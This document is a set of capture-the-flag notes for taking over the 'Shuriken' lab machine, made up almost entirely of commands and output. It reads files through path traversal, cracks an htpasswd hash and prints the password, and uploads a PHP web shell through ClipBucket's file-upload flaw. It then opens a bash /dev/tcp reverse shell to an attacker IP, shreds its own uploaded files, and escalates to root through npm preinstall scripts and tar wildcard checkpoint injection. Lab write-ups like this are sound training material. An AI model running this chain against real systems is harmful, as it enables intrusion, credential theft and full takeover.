## init
```bash
arp-scan -I wlo1 --localnet
ping -c 1 192.168.1.16

nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 192.168.1.16 -oG allPOrts
nmap -sCV -p 80,8080 192.168.1.16 -oN targeted

whatweb http://192.168.1.16
whatweb http://192.168.1.16:8080

dirb http://192.168.1.16/ /usr/share/wordlists/dirb/common.txt 
nmap --script http-enum -p 80 192.168.1.16 -oN webScan

# In /js
<>
   }, t.p = "http://broadcast.shuriken.local", t(t.s = 0)
}({
    0: function(a, e, t) {
        a.exports = t("WdQY")
    },
    WdQY: function(a, e, t) {
        "use strict";

        function n(a, e, t) {
            return e in a ? Object.defineProperty(a, e, {
                value: t,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : a[e] = t, a
        }
        t.r(e);
        var s = t("kiQV");

        function l(a) {
            var e = a.host,
                t = a.chatAlias,
                n = a.callbackAlias,
                s = a.lang;
            return fetch(function(a) {
                var e = a.host,
                    t = a.chatAlias,
                    n = void 0 === t ? "" : t,
                    s = a.callbackAlias,
                    l = void 0 === s ? "" : s,
                    i = a.lang,
                    c = void 0 === i ? "pl-PL" : i;
                return "".concat(void 0 === e ? "http://broadcast.shuriken.local" : e).concat("/", "?_alias=").concat(n, "&_callbackAlias=").concat(l, "&_lang=").concat(c)
            }({

ping -c 1 shuriken.local

# Virtual hosting, add to /etc/hosts
broadcast.shuriken.local
shuriken.local

ping -c 1 shuriken.local
ping -c 1 broadcast.shuriken.local

# FOMr second js file
    }, n.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "http://shuriken.local/index.php?referer=", n(n.s = 0)
}({

curl -s -X GET "http://shuriken.local/index.php?referer=/etc/passwd"

gobuster vhost -u http://shuriken.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt # to get vhost

# We can view apache 2 conf files
curl -s -X GET "http://shuriken.local/index.php?referer=/etc/apache2/sites-enabled/000-default.conf"

# ans
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName broadcast.shuriken.local
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	<Directory /var/www/html>
		Order allow,deny
		allow from all
		AuthType Basic
		AuthName "Restricted Content"
		AuthUserFile /etc/apache2/.htpasswd
		Require valid-user
	</Directory>
</VirtualHost>

curl -s -X GET "http://shuriken.local/index.php?referer=/etc/apache2/.htpasswd"
# ans
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0

# save previous credeeia into a file named credentials.txt
sudo apt install john
locate rockyou.txt

john -w:/usr/share/wordlists/rockyou.txt credentials.txt

# ans
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761drmfsls   (developers) # pass  
1g 0:00:00:06 DONE (2025-04-24 00:10) 0.1597g/s 345231p/s 345231c/s 345231C/s 99pontaic..99686420
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

# We can enter to broadcast.shuriken.local with credentials
searchsploit clipbucket

# ans
ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection 

searchsploit -x php/webapps/44250.txt

# ans
2. Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the webserver with no
authentication required.

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/photo_uploader.php"

# We need to upload a cmd.php file

```
```php
<?php
    echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"
?>
```
```bash
curl -F "file=@cmd.php" -F "plupload=1" -F "name=cmd.php" http://developers:9972761drmfsls@broadcast.shuriken.local/actions/photo_uploader.php # developers:9972761drmfsls for credetials

# ans
{"success":"yes","file_name":"1745460596cccd16","extension":"php","file_directory":"2025\/04\/24"}

gobuster dir -u http://developers:9972761drmfsls@broadcast.shuriken.local -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
# ans
/files                (Status: 301) [Size: 336] [--> http://broadcast.shuriken.local/files/]
/plugins              (Status: 301) [Size: 338] [--> http://broadcast.shuriken.local/plugins/]
/ajax                 (Status: 301) [Size: 335] [--> http://broadcast.shuriken.local/ajax/]
/includes             (Status: 301) [Size: 339] [--> http://broadcast.shuriken.local/includes/]
/js                   (Status: 301) [Size: 333] [--> http://broadcast.shuriken.local/js/]
/api                  (Status: 301) [Size: 334] [--> http://broadcast.shuriken.local/api/]
/images               (Status: 301) [Size: 337] [--> http://broadcast.shuriken.local/images/]
/cache                (Status: 301) [Size: 336] [--> http://broadcast.shuriken.local/cache/]
/player               (Status: 301) [Size: 337] [--> http://broadcast.shuriken.local/player/]
/styles               (Status: 301) [Size: 337] [--> http://broadcast.shuriken.local/styles/]
/readme               (Status: 200) [Size: 2968]
/LICENSE              (Status: 200) [Size: 2588]

# ENter to the URL and find current uploaded file
http://broadcast.shuriken.local/files/photos/2025/04/24/1745460596cccd16.php

http://broadcast.shuriken.local/files/photos/2025/04/24/1745460596cccd16.php?cmd=whoami

# Applicate oneliner to reverseshell
bash -c "bash -i >& /dev/tcp/192.168.1.12/443 0>&1"
bash -c "bash -i >%26 /dev/tcp/192.168.1.12/443 0>%261" # url encoded 
<>

nc -nlvp 443
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
export TERM=xtem-256color
source /etc/skel/.bashrc

sudo -l
# ans
Matching Defaults entries for www-data on shuriken:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on shuriken:
    (server-management) NOPASSWD: /usr/bin/npm

# Delete created files
which shred
shred -zun 10 -v *

# From GTFOBINS
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i

TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo -u server-management npm -C $TF --unsafe-perm i # update for machine

# ans
npm ERR! code EACCES
npm ERR! syscall open
npm ERR! path /tmp/tmp.4fbrwnj2KO/npm-shrinkwrap.json
npm ERR! errno -13
npm ERR! Error: EACCES: permission denied, open '/tmp/tmp.4fbrwnj2KO/npm-shrinkwrap.json'
npm ERR!  [OperationalError: EACCES: permission denied, open '/tmp/tmp.4fbrwnj2KO/npm-shrinkwrap.json'] {
npm ERR!   cause: [Error: EACCES: permission denied, open '/tmp/tmp.4fbrwnj2KO/npm-shrinkwrap.json'] {
npm ERR!     errno: -13,
npm ERR!     code: 'EACCES',
npm ERR!     syscall: 'open',
npm ERR!     path: '/tmp/tmp.4fbrwnj2KO/npm-shrinkwrap.json' # err
npm ERR!   },
npm ERR!   isOperational: true,
npm ERR!   errno: -13,
npm ERR!   code: 'EACCES',
npm ERR!   syscall: 'open',
npm ERR!   path: '/tmp/tmp.4fbrwnj2KO/npm-shrinkwrap.json'
npm ERR! }
npm ERR! 
npm ERR! The operation was rejected by your operating system.
npm ERR! It is likely you do not have the permissions to access this file as the current user
npm ERR! 
npm ERR! If you believe this might be a permissions issue, please double-check the
npm ERR! permissions of the file and its containing directories, or try running
npm ERR! the command again as root/Administrator.

npm ERR! A complete log of this run can be found in:
npm ERR!     /home/server-management/.npm/_logs/2025-04-24T02_50_19_355Z-debug.log

# We nedd to add 777 perm to the file
chmod 777 -R $(echo $TF)

# Then, run last command
sudo -u server-management npm -C $TF --unsafe-perm i

# We getting acces to server-management user
whomai
bash
cd
ls
cat user.txt
67528b07b382dfaa490f4dffc57dcdc0

sudo -l # we nedd pass
id
# ans
uid=1000(server-management) gid=1000(server-management) groups=1000(server-management),24(cdrom),30(dip),46(plugdev),116(lpadmin),122(sambashare)

cd /
<>
find / -perm -4000 -ls 2>/dev/null

# ans
   135191     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   133792     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   136643     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   151875    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   131144     76 -rwsr-xr-x   1 root     root          75824 Jan 25  2018 /usr/bin/gpasswd
   136641     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
   133739    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
   131141     76 -rwsr-xr-x   1 root     root          76496 Jan 25  2018 /usr/bin/chfn
   131142     44 -rwsr-xr-x   1 root     root          44528 Jan 25  2018 /usr/bin/chsh
   131145     60 -rwsr-xr-x   1 root     root          59640 Jan 25  2018 /usr/bin/passwd
   131035     40 -rwsr-xr-x   1 root     root          40344 Jan 25  2018 /usr/bin/newgrp
   153086     20 -rwsr-xr-x   1 root     root          18448 Mar  9  2017 /usr/bin/traceroute6.iputils
   158800    372 -rwsr-xr--   1 root     dip          378600 Jul 23  2020 /usr/sbin/pppd
   260270     44 -rwsr-xr-x   1 root     root          43088 Sep 16  2020 /bin/mount
   260271     28 -rwsr-xr-x   1 root     root          26696 Sep 16  2020 /bin/umount
   260253     44 -rwsr-xr-x   1 root     root          44664 Jan 25  2018 /bin/su
   273696     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount
   260501     64 -rwsr-xr-x   1 root     root          64424 Mar  9  2017 /bin/ping

# We can ise pwnkit to attack to /usr/bin/pkexec
# We need to use pspy. Downloaded it and send it to remote machine
https://github.com/DominicBreuker/pspy/releases

which wget # in remote machine
which curl # in remote machine
curl http://192.168.1.12/pspy64 -o pspy # in remote machine | -o = output
chmod -x pspy
./pspy

# ans
2025/04/24 05:18:01 CMD: UID=0     PID=3305   | /bin/bash /var/opt/backupsrv.sh 
2025/04/24 05:20:01 CMD: UID=0     PID=3309   | /bin/bash /var/opt/backupsrv.sh 
2025/04/24 05:20:01 CMD: UID=0     PID=3308   | /bin/sh -c /var/opt/backupsrv.sh 

cat /var/opt/backupsrv.sh 

# ans
# file******************
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
# end file *******************

# CHeck in GTFOBINS tar with wildcards
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Create into this oath /home/server-management/Documents the following files
touch -- --checkpoint=1
touch -- --checkpoint-action=exec='sh command'

touch command
chmod +x command
nano command

# into file
chmod u+s /bin/bash

# Wait for the cron task to view changes
watch -n 1 ls -l /bin/bash

-rwxr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash # changed

bash -p 
cd /root
cat root.txt

d0f9655a4454ac54e3002265d40b2edd
                                          __                   
  ____  ____   ____    ________________ _/  |_  ______         
_/ ___\/  _ \ /    \  / ___\_  __ \__  \\   __\/  ___/         
\  \__(  <_> )   |  \/ /_/  >  | \// __ \|  |  \___ \          
 \___  >____/|___|  /\___  /|__|  (____  /__| /____  >         
     \/           \//_____/            \/          \/          
                                            __             .___
 ___.__. ____  __ __  _______  ____   _____/  |_  ____   __| _/
<   |  |/  _ \|  |  \ \_  __ \/  _ \ /  _ \   __\/ __ \ / __ | 
 \___  (  <_> )  |  /  |  | \(  <_> |  <_> )  | \  ___// /_/ | 
 / ____|\____/|____/   |__|   \____/ \____/|__|  \___  >____ | 
 \/                                                  \/     \/ 
  _________.__                 .__ __                          
 /   _____/|  |__  __ _________|__|  | __ ____   ____          
 \_____  \ |  |  \|  |  \_  __ \  |  |/ // __ \ /    \         
 /        \|   Y  \  |  /|  | \/  |    <\  ___/|   |  \        
/_______  /|___|  /____/ |__|  |__|__|_ \\___  >___|  / 

```